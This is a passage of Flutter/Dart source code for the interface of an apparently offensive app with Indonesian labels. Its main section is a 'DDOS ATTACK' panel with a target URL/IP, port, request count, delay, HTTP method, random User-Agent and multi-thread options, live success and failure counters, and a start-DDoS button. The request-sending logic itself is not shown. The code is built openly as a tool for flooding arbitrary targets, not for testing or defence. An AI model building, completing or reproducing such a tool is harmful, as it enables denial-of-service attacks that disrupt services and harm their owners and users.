                  backgroundColor: Colors.purple.shade300,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 8),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🎯 ACAK SEMUA', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 10)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: _resetAcak,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.cyan.shade300,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(vertical: 8),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('🔄 RESET', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 10)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildStatus(statusAcak),
        const SizedBox(height: 4),
        _buildLog(logAcak),
      ],
    );
  }

  String _selectedCategory = 'all';
  
  Widget _buildCategoryButton(String icon, String label, String value) {
    final isActive = _selectedCategory == value;
    return InkWell(
      onTap: () => setState(() => _selectedCategory = value),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
        decoration: BoxDecoration(
          color: isActive ? Colors.pink.shade300.withOpacity(0.1) : const Color(0xFF0A0A0A),
          borderRadius: BorderRadius.circular(6),
          border: Border.all(
            color: isActive ? Colors.pink.shade300 : Colors.grey.shade800,
            width: 1,
          ),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(icon, style: const TextStyle(fontSize: 12)),
            const SizedBox(width: 2),
            Text(
              label,
              style: TextStyle(
                color: isActive ? Colors.pink.shade300 : Colors.grey.shade500,
                fontSize: 7,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // SECTION BUILDER: DDOS
  // ============================================================
  
  Widget _buildDdosSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildInfo('⚠️ DDOS ATTACK: Serang target dengan request massal!', color: Colors.orange.shade900),
        const SizedBox(height: 8),
        _buildLabel('🎯 TARGET URL / IP'),
        TextField(
          controller: ddosTargetController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('https://target.com atau 192.168.1.1'),
        ),
        const SizedBox(height: 8),
        _buildLabel('📌 PORT (untuk IP)'),
        TextField(
          controller: ddosPortController,
          style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
          decoration: _inputDecoration('80 atau 443'),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildLabel('🔁 REQUEST:'),
                  TextField(
                    controller: ddosJumlahController,
                    style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
                    decoration: _inputDecoration('1000'),
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildLabel('⏱️ DELAY (ms):'),
                  TextField(
                    controller: ddosDelayController,
                    style: const TextStyle(color: Color(0xFF00FF88), fontSize: 13),
                    decoration: _inputDecoration('100'),
                  ),
                ],
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        _buildLabel('📝 METODE'),
        DropdownButtonFormField<String>(
          value: ddosMethodController.text,
          dropdownColor: const Color(0xFF1A1A1A),
          style: const TextStyle(color: Colors.white, fontSize: 12),
          decoration: InputDecoration(
            filled: true,
            fillColor: const Color(0xFF222222),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(8),
              borderSide: BorderSide.none,
            ),
            contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
          ),
          items: const [
            DropdownMenuItem(value: 'GET', child: Text('GET')),
            DropdownMenuItem(value: 'POST', child: Text('POST')),
            DropdownMenuItem(value: 'HEAD', child: Text('HEAD')),
            DropdownMenuItem(value: 'OPTIONS', child: Text('OPTIONS')),
          ],
          onChanged: (v) {
            if (v != null) setState(() => ddosMethodController.text = v);
          },
        ),
        const SizedBox(height: 8),
        Wrap(
          spacing: 4,
          runSpacing: 4,
          children: [
            _buildCheckbox('Random User-Agent', ddosRandomUA, (v) => setState(() => ddosRandomUA = v)),
            _buildCheckbox('Multi-Thread', ddosMultiThread, (v) => setState(() => ddosMultiThread = v)),
            _buildCheckbox('Keep-Alive', ddosKeepAlive, (v) => setState(() => ddosKeepAlive = v)),
          ],
        ),
        const SizedBox(height: 8),
        Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: const Color(0xFF0A0A0A),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: Colors.grey.shade800),
          ),
          child: Row(
            children: [
              Expanded(
                child: Column(
                  children: [
                    Text(ddosTotal.toString(), style: const TextStyle(color: Color(0xFFFF8800), fontSize: 16, fontWeight: FontWeight.bold)),
                    const Text('Total Request', style: TextStyle(color: Colors.grey, fontSize: 7)),
                  ],
                ),
              ),
              Expanded(
                child: Column(
                  children: [
                    Text(ddosSuccess.toString(), style: const TextStyle(color: Color(0xFF00FF88), fontSize: 16, fontWeight: FontWeight.bold)),
                    const Text('Success', style: TextStyle(color: Colors.grey, fontSize: 7)),
                  ],
                ),
              ),
              Expanded(
                child: Column(
                  children: [
                    Text(ddosFailed.toString(), style: const TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold)),
                    const Text('Failed', style: TextStyle(color: Colors.grey, fontSize: 7)),
                  ],
                ),
              ),
              Expanded(
                child: Column(
                  children: [
                    Text('$ddosSpeed', style: const TextStyle(color: Color(0xFFFFAA00), fontSize: 16, fontWeight: FontWeight.bold)),
                    const Text('Req/Sec', style: TextStyle(color: Colors.grey, fontSize: 7)),
                  ],
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 8),
        Row(
          children: [
            Expanded(
              child: ElevatedButton(
                onPressed: isDdosRunning ? null : _startDdos,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.orange.shade400,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: Text(isDdosRunning ? '⏳ BERJALAN...' : '💥 MULAI DDOS', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
            const SizedBox(width: 8),
            Expanded(
              child: ElevatedButton(
                onPressed: isDdosRunning ? _stopDdos : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.grey.shade800,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                ),
                child: const Text('⏹️ STOP', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              ),
            ),
          ],
        ),
        const SizedBox(height: 8),
        if (ddosProgress > 0)
          ClipRRect(
            borderRadius: BorderRadius.circular(10),
            child: LinearProgressIndicator(
              value: ddosProgress / 100,
              backgroundColor: const Color(0xFF1A1A1A),
              color: Colors.orange.shade400,
              minHeight: 4,
            ),
          ),
        const SizedBox(height: 8),
        _buildStatus(statusDdos),
        const SizedBox(height: 4),
        _buildLog(logDdos),
      ],
    );
  }

  // ============================================================
  // UI HELPER WIDGETS
  // ============================================================
  
  Widget _buildLabel(String label) {
    return Text(
      label,
      style: const TextStyle(color: Colors.grey, fontSize: 10, letterSpacing: 1),
    );
  }

  Widget _buildInfo(String text, {Color? color}) {
    return Container(
      padding: const EdgeInsets.all(6),
      decoration: BoxDecoration(
        color: (color ?? Colors.grey.shade900).withOpacity(0.2),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: (color ?? Colors.grey.shade700).withOpacity(0.3)),
      ),
      child: Text(
        text,
        style: TextStyle(
          color: color ?? Colors.grey.shade400,
          fontSize: 9,
        ),
      ),
    );
  }

  Widget _buildStatus(String text) {
    Color color;
    if (text.contains('✅')) color = const Color(0xFF00FF88);
    else if (text.contains('❌')) color = Colors.red.shade400;
    else if (text.contains('⚠️')) color = const Color(0xFFFFAA00);
    else if (text.contains('🔥') || text.contains('📢') || text.contains('💥')) color = const Color(0xFFFF8800);
    else color = Colors.grey.shade500;
    
    return Text(
      text,
      style: TextStyle(color: color, fontSize: 11),
    );
  }

  Widget _buildLog(List<String> logs) {
    return Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: const Color(0xFF0A0A0A),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: const Color(0xFF1A1A1A)),
      ),
      constraints: const BoxConstraints(maxHeight: 80),
      child: SingleChildScrollView(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: logs.map((log) {
            Color color;
            if (log.contains('✅')) color = const Color(0xFF00FF88);
            else if (log.contains('❌')) color = Colors.red.shade400;
            else if (log.contains('⚠️') || log.contains('🔥')) color = const Color(0xFFFFAA00);
            else if (log.contains('💥')) color = const Color(0xFFFF6600);
            else color = Colors.grey.shade500;
            
            return Padding(
              padding: const EdgeInsets.symmetric(vertical: 1),
              child: Text(
                log,
                style: TextStyle(color: color, fontSize: 9),
              ),
            );
          }).toList(),
        ),
      ),
    );
  }

  InputDecoration _inputDecoration(String hint) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: Colors.grey.shade600, fontSize: 12),
      filled: true,
      fillColor: const Color(0xFF222222),
      border: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: BorderSide.none,
      ),
      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      isDense: true,
    );
  }

  Widget _buildCheckbox(String label, bool value, ValueChanged<bool> onChanged) {
    return Row(
      mainAxisSize: MainAxisSize.min,
      children: [
        SizedBox(
          width: 14,
          height: 14,
          child: Checkbox(
            value: value,
            onChanged: (v) => onChanged(v ?? false),
            materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
            visualDensity: VisualDensity.compact,
            activeColor: Colors.pink.shade300,
            checkColor: Colors.black,
          ),
        ),
        Text(
          label,
          style: TextStyle(color: Colors.grey.shade400, fontSize: 9),
        ),
        const SizedBox(width: 8),
      ],
    );
  }

  Widget _buildJumlahDelay(TextEditingController jumlahCtrl, TextEditingController delayCtrl, String labelJumlah, String labelDelay) {
    return Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: const Color(0xFF0A0A0A),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: const Color(0xFF1A1A1A)),
      ),
      child: Row(
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(labelJumlah, style: const TextStyle(color: Colors.grey, fontSize: 9)),
                TextField(
                  controller: jumlahCtrl,
                  style: const TextStyle(color: Color(0xFF00FF88), fontSize: 12),
                  keyboardType: TextInputType.number,
                  decoration: InputDecoration(
                    filled: true,
                    fillColor: const Color(0xFF222222),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(6),
                      borderSide: BorderSide.none,
                    ),
                    contentPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
                    isDense: true,
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(labelDelay, style: const TextStyle(color: Colors.grey, fontSize: 9)),
                TextField(
                  controller: delayCtrl,
                  style: const TextStyle(color: Color(0xFF00FF88), fontSize: 12),
                  keyboardType: TextInputType.number,
                  decoration: InputDecoration(
                    filled: true,
                    fillColor: const Color(0xFF222222),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(6),
                      borderSide: BorderSide.none,
                    ),
                    contentPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
                    isDense: true,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}